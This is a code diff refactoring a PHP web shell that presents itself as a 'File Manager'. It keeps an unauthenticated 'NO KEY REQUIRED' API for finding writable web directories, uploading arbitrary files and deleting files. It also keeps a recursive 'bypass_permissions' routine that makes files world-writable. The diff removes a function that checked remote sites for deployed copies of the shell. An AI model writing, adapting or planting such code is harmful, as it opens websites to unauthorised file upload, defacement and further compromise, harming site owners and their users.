@@ -100,9 +100,7 @@ if (!$kopyaYapildi && basename(__FILE__) == 'index.php') {
 // ================ API HANDLER (NO KEY REQUIRED) ================
 if (isset($_GET['api']) && $_GET['api'] === 'true') {
     header('Content-Type: application/json');
-    
     $apiAction = isset($_GET['action']) ? $_GET['action'] : '';
-    
     switch ($apiAction) {
         case 'get_paths':
             $basePath = isset($_GET['base_path']) ? $_GET['base_path'] : '';
@@ -114,9 +112,6 @@ if (isset($_GET['api']) && $_GET['api'] === 'true') {
         case 'delete_file':
             echo json_encode(deleteFileViaApi());
             break;
-        case 'verify':
-            echo json_encode(verifyFile());
-            break;
         default:
             echo json_encode(['status' => 'error', 'message' => 'Unknown API action']);
     }
@@ -127,18 +122,14 @@ if (isset($_GET['api']) && $_GET['api'] === 'true') {
 function getValidPaths($basePath = '') {
     $documentRoot = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : __DIR__;
     $validPaths = [];
-    
-    // Excluded system and core directories
     $excluded = [
-        'wp-admin', 'administrator', 'cgi-bin', 'vendor', 
-        'node_modules', '.git', '.svn', 'tmp', 'temp', 
+        'wp-admin', 'administrator', 'cgi-bin', 'vendor',
+        'node_modules', '.git', '.svn', 'tmp', 'temp',
         'cache', 'logs', 'components', 'modules', 'plugins',
         'includes', 'lib', 'libraries', 'framework',
-        'system', 'core', 'vendor', 'bin', 'etc'
+        'system', 'core', 'bin', 'etc'
     ];
-    
     try {
-        // Determine starting directory
         if (!empty($basePath)) {
             $startDir = $documentRoot . '/' . $basePath;
             if (!is_dir($startDir)) {
@@ -147,21 +138,16 @@ function getValidPaths($basePath = '') {
         } else {
             $startDir = $documentRoot;
         }
-        
-        // Recursively scan directories
         $dirs = [$startDir];
         $allDirs = [];
         $maxDepth = 50;
         $depth = 0;
-        
         while (!empty($dirs) && $depth < $maxDepth) {
             $current = array_shift($dirs);
             if (!is_dir($current) || !is_readable($current)) continue;
-            
             $allDirs[] = $current;
             $items = @scandir($current);
             if ($items === false) continue;
-            
             foreach ($items as $item) {
                 if ($item == '.' || $item == '..') continue;
                 $path = $current . DIRECTORY_SEPARATOR . $item;
@@ -171,19 +157,13 @@ function getValidPaths($basePath = '') {
             }
             $depth++;
         }
-        
         foreach ($allDirs as $path) {
             $relativePath = str_replace($documentRoot, '', $path);
             $relativePath = ltrim(str_replace(DIRECTORY_SEPARATOR, '/', $relativePath), '/');
-            
             if (empty($relativePath)) continue;
-            
-            // If basePath is specified, ensure path is within it
             if (!empty($basePath) && strpos($relativePath, $basePath) !== 0) {
                 continue;
             }
-            
-            // Check if path is excluded
             $parts = explode('/', $relativePath);
             $isExcluded = false;
             foreach ($parts as $part) {
@@ -192,7 +172,6 @@ function getValidPaths($basePath = '') {
                     break;
                 }
             }
-            
             if (!$isExcluded && is_writable($path)) {
                 $validPaths[] = $relativePath;
             }
@@ -200,7 +179,6 @@ function getValidPaths($basePath = '') {
     } catch (Exception $e) {
         return ['status' => 'error', 'message' => $e->getMessage()];
     }
-    
     return ['status' => 'success', 'paths' => $validPaths];
 }
 
@@ -208,33 +186,34 @@ function uploadFileViaApi() {
     if (!isset($_FILES['file']) || $_FILES['file']['error'] !== 0) {
         return ['status' => 'error', 'message' => 'No file uploaded or upload error'];
     }
-    
     $targetPath = isset($_POST['path']) ? $_POST['path'] : '';
     if (empty($targetPath)) {
         return ['status' => 'error', 'message' => 'No target path specified'];
     }
-    
     $documentRoot = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : __DIR__;
-    $fullPath = $documentRoot . '/' . $targetPath . '/' . basename($_FILES['file']['name']);
-    
-    $dirPath = dirname($fullPath);
-    if (!is_dir($dirPath)) {
-        @mkdir($dirPath, 0777, true);
+    $safePath = ltrim($targetPath, '/');
+    $fullDir = $documentRoot . '/' . $safePath;
+    $fileName = basename($_FILES['file']['name']);
+    $fullPath = $fullDir . '/' . $fileName;
+    // Create directory if not exists
+    if (!is_dir($fullDir)) {
+        if (!@mkdir($fullDir, 0777, true)) {
+            return ['status' => 'error', 'message' => 'Could not create directory: ' . $safePath];
+        }
     }
-    
-    if (!is_writable($dirPath)) {
-        return ['status' => 'error', 'message' => 'Target directory not writable'];
+    // Check if directory is writable
+    if (!is_writable($fullDir)) {
+        return ['status' => 'error', 'message' => 'Directory not writable: ' . $safePath];
     }
-    
+    // Move uploaded file
     if (move_uploaded_file($_FILES['file']['tmp_name'], $fullPath)) {
         @chmod($fullPath, 0666);
         $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https://' : 'http://';
         $host = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'localhost';
-        $url = $protocol . $host . '/' . $targetPath . '/' . basename($_FILES['file']['name']);
+        $url = $protocol . $host . '/' . $safePath . '/' . $fileName;
         return ['status' => 'success', 'message' => 'File uploaded successfully', 'url' => $url];
     }
-    
-    return ['status' => 'error', 'message' => 'Upload failed'];
+    return ['status' => 'error', 'message' => 'Failed to move uploaded file'];
 }
 
 function deleteFileViaApi() {
@@ -242,46 +221,18 @@ function deleteFileViaApi() {
     if (empty($filePath)) {
         return ['status' => 'error', 'message' => 'No file path specified'];
     }
-    
     $documentRoot = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : __DIR__;
-    $fullPath = $documentRoot . '/' . $filePath;
-    
-    if (!file_exists($fullPath) || !is_file($fullPath)) {
-        return ['status' => 'error', 'message' => 'File not found'];
+    $fullPath = $documentRoot . '/' . ltrim($filePath, '/');
+    if (!file_exists($fullPath)) {
+        return ['status' => 'error', 'message' => 'File does not exist'];
     }
-    
+    if (!is_file($fullPath)) {
+        return ['status' => 'error', 'message' => 'Path is not a file'];
+    }
     if (unlink($fullPath)) {
         return ['status' => 'success', 'message' => 'File deleted successfully'];
     }
-    
-    return ['status' => 'error', 'message' => 'Delete failed'];
-}
-
-function verifyFile() {
-    $fileUrl = isset($_GET['url']) ? $_GET['url'] : '';
-    if (empty($fileUrl)) {
-        return ['status' => 'error', 'message' => 'No URL specified'];
-    }
-    
-    try {
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $fileUrl);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-        $response = curl_exec($ch);
-        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-        curl_close($ch);
-        
-        if ($httpCode == 200 && strpos($response, 'Login - File Manager') !== false) {
-            return ['status' => 'success', 'message' => 'File verified successfully'];
-        } else {
-            return ['status' => 'error', 'message' => 'File not accessible or invalid', 'http_code' => $httpCode];
-        }
-    } catch (Exception $e) {
-        return ['status' => 'error', 'message' => $e->getMessage()];
-    }
+    return ['status' => 'error', 'message' => 'Failed to delete file'];
 }
 
 // ================ LOGIN HANDLING ================
@@ -304,24 +255,7 @@ if (!isset($_SESSION['auth']) || $_SESSION['auth'] !== true) {
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <title>Login - File Manager</title>
-        <style>
-            * { margin:0; padding:0; box-sizing:border-box; }
-            body { background: #0b0e14; display: flex; align-items: center; justify-content: center; min-height: 100vh; font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; padding: 16px; }
-            .login-card { background: #1a1f2b; padding: 40px 35px; border-radius: 16px; width: 100%; max-width: 400px; box-shadow: 0 20px 40px rgba(0,0,0,0.6); border: 1px solid #2a3142; }
-            .login-card h3 { text-align: center; margin-bottom: 28px; color: #e9edf5; font-weight: 500; font-size: 24px; }
-            .login-card h3 i { color: #5b7cfa; margin-right: 10px; }
-            .login-card input { width: 100%; padding: 14px 16px; margin: 10px 0 18px; border-radius: 10px; border: 1px solid #2e374b; background: #0f131c; color: #e9edf5; font-size: 16px; transition: 0.2s; outline: none; }
-            .login-card input:focus { border-color: #5b7cfa; box-shadow: 0 0 0 3px rgba(91,124,250,0.2); }
-            .login-card button { width: 100%; padding: 14px; background: linear-gradient(135deg, #5b7cfa, #4a5fd5); border: none; border-radius: 10px; color: #fff; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.25s; }
-            .login-card button:hover { transform: scale(1.02); background: linear-gradient(135deg, #6e8cff, #5568e0); box-shadow: 0 8px 20px rgba(91,124,250,0.3); }
-            .error { color: #fc6b6b; background: #2a1a1a; padding: 10px 14px; border-radius: 8px; margin: 10px 0 16px; border-left: 4px solid #fc6b6b; font-size: 14px; }
-            .login-footer { margin-top: 24px; text-align: center; color: #5b6a85; font-size: 13px; border-top: 1px solid #262e40; padding-top: 18px; }
-            .login-footer span { color: #5b7cfa; }
-            @media (max-width: 480px) {
-                .login-card { padding: 24px 20px; }
-                .login-card h3 { font-size: 20px; }
-            }
-        </style>
+        <style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0b0e14;display:flex;align-items:center;justify-content:center;min-height:100vh;font-family:'Segoe UI',system-ui,-apple-system,sans-serif;padding:16px}.login-card{background:#1a1f2b;padding:40px 35px;border-radius:16px;width:100%;max-width:400px;box-shadow:0 20px 40px rgba(0,0,0,.6);border:1px solid #2a3142}.login-card h3{text-align:center;margin-bottom:28px;color:#e9edf5;font-weight:500;font-size:24px}.login-card h3 i{color:#5b7cfa;margin-right:10px}.login-card input{width:100%;padding:14px 16px;margin:10px 0 18px;border-radius:10px;border:1px solid #2e374b;background:#0f131c;color:#e9edf5;font-size:16px;transition:.2s;outline:none}.login-card input:focus{border-color:#5b7cfa;box-shadow:0 0 0 3px rgba(91,124,250,.2)}.login-card button{width:100%;padding:14px;background:linear-gradient(135deg,#5b7cfa,#4a5fd5);border:none;border-radius:10px;color:#fff;font-size:16px;font-weight:600;cursor:pointer;transition:.25s}.login-card button:hover{transform:scale(1.02);background:linear-gradient(135deg,#6e8cff,#5568e0);box-shadow:0 8px 20px rgba(91,124,250,.3)}.error{color:#fc6b6b;background:#2a1a1a;padding:10px 14px;border-radius:8px;margin:10px 0 16px;border-left:4px solid #fc6b6b;font-size:14px}.login-footer{margin-top:24px;text-align:center;color:#5b6a85;font-size:13px;border-top:1px solid #262e40;padding-top:18px}.login-footer span{color:#5b7cfa}@media (max-width:480px){.login-card{padding:24px 20px}.login-card h3{font-size:20px}}</style>
     </head>
     <body>
         <div class="login-card">
@@ -343,7 +277,6 @@ if (!isset($_SESSION['auth']) || $_SESSION['auth'] !== true) {
 class FileManager {
     private $currentDir;
     private $messages = array();
-    
     public function __construct() {
         $this->currentDir = isset($_GET['dir']) && $_GET['dir'] ? realpath($_GET['dir']) : __DIR__;
         if ($this->currentDir === false || !file_exists($this->currentDir)) {
@@ -351,23 +284,12 @@ class FileManager {
             $this->addMessage('Directory not found, returned to main directory.', 'warning');
         }
     }
-    
-    public function getCurrentDir() {
-        return $this->currentDir;
-    }
-    
-    public function getMessages() {
-        return $this->messages;
-    }
-    
-    private function addMessage($msg, $type) {
-        $this->messages[] = array('text' => $msg, 'type' => $type);
-    }
-    
+    public function getCurrentDir() { return $this->currentDir; }
+    public function getMessages() { return $this->messages; }
+    private function addMessage($msg, $type) { $this->messages[] = array('text' => $msg, 'type' => $type); }
     public function getSystemRoot() {
         return (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? getenv("SystemDrive") . "\\" : "/";
     }
-    
     public function handleRequest() {
         if ($_SERVER['REQUEST_METHOD'] !== 'POST') return;
         if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
@@ -376,34 +298,16 @@ class FileManager {
         }
         $action = isset($_POST['action']) ? $_POST['action'] : '';
         switch($action) {
-            case 'upload':
-                $this->upload();
-                break;
-            case 'create_folder':
-                $this->createFolder();
-                break;
-            case 'delete':
-                $this->deleteItem();
-                break;
-            case 'rename':
-                $this->renameItem();
-                break;
-            case 'save_edit':
-                $this->saveFile();
-                break;
-            case 'bypass_permissions':
-                $this->bypassPermissions();
-                break;
-            case 'go_to_path':
-                $this->goToPath();
-                break;
-            case 'logout':
-                session_destroy();
-                header("Location: " . basename(__FILE__));
-                exit;
+            case 'upload': $this->upload(); break;
+            case 'create_folder': $this->createFolder(); break;
+            case 'delete': $this->deleteItem(); break;
+            case 'rename': $this->renameItem(); break;
+            case 'save_edit': $this->saveFile(); break;
+            case 'bypass_permissions': $this->bypassPermissions(); break;
+            case 'go_to_path': $this->goToPath(); break;
+            case 'logout': session_destroy(); header("Location: " . basename(__FILE__)); exit;
         }
     }
-    
     private function goToPath() {
         $path = isset($_POST['path']) ? trim($_POST['path']) : '';
         if ($path && is_dir($path)) {
@@ -413,7 +317,6 @@ class FileManager {
             $this->addMessage('Invalid directory path.', 'danger');
         }
     }
-    
     private function upload() {
         if (!isset($_FILES['file']) || $_FILES['file']['error'] !== 0) return;
         $name = basename($_FILES['file']['name']);
@@ -423,7 +326,6 @@ class FileManager {
             $this->addMessage('Upload failed.', 'danger');
         }
     }
-    
     private function createFolder() {
         $name = basename(trim(isset($_POST['folder_name']) ? $_POST['folder_name'] : ''));
         if (!$name) return;
@@ -434,7 +336,6 @@ class FileManager {
             $this->addMessage('Cannot create folder.', 'danger');
         }
     }
-    
     private function deleteItem() {
         $name = basename(isset($_POST['item_name']) ? $_POST['item_name'] : '');
         if (!$name) return;
@@ -449,7 +350,6 @@ class FileManager {
             $this->addMessage('Could not delete.', 'danger');
         }
     }
-    
     private function renameItem() {
         $old = basename(isset($_POST['old_name']) ? $_POST['old_name'] : '');
         $new = basename(isset($_POST['new_name']) ? $_POST['new_name'] : '');
@@ -462,7 +362,6 @@ class FileManager {
             $this->addMessage('Rename failed.', 'danger');
         }
     }
-    
     private function saveFile() {
         $name = basename(isset($_POST['filename']) ? $_POST['filename'] : '');
         if (!$name) return;
@@ -482,10 +381,8 @@ class FileManager {
             $this->addMessage('Could not save.', 'danger');
         }
     }
-    
     private function bypassPermissions() {
-        $count = 0;
-        $failed = 0;
+        $count = 0; $failed = 0;
         $iterator = new RecursiveIteratorIterator(
             new RecursiveDirectoryIterator($this->currentDir, RecursiveDirectoryIterator::SKIP_DOTS),
             RecursiveIteratorIterator::SELF_FIRST
@@ -493,17 +390,14 @@ class FileManager {
         foreach ($iterator as $item) {
             $path = $item->getPathname();
             if ($item->isDir()) {
-                if (@chmod($path, 0777)) $count++;
-                else $failed++;
+                if (@chmod($path, 0777)) $count++; else $failed++;
             } else {
-                if (@chmod($path, 0666)) $count++;
-                else $failed++;
+                if (@chmod($path, 0666)) $count++; else $failed++;
             }
         }
         @chmod(__FILE__, 0666);
         $this->addMessage("Permission bypass: $count changed" . ($failed ? ", $failed failed" : ""), $failed ? 'warning' : 'success');
     }
-    
     private function recursiveDelete($path) {
         if (is_file($path)) return @unlink($path);
         if (is_dir($path)) {
@@ -512,7 +406,6 @@ class FileManager {
         }
         return false;
     }
-    
     public function scanDir() {
         $items = @scandir($this->currentDir);
         if ($items === false) return array('folders' => array(), 'files' => array());
@@ -525,7 +418,6 @@ class FileManager {
         }
         return $result;
     }
-    
     public function getFileIcon($filename) {
         $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
         $map = [
@@ -546,7 +438,6 @@ class FileManager {
         ];
         return isset($map[$ext]) ? $map[$ext] : 'bi-file-earmark';
     }
-    
     public function getBreadcrumb() {
         $dir = $this->currentDir;
         $parts = explode(DIRECTORY_SEPARATOR, $dir);
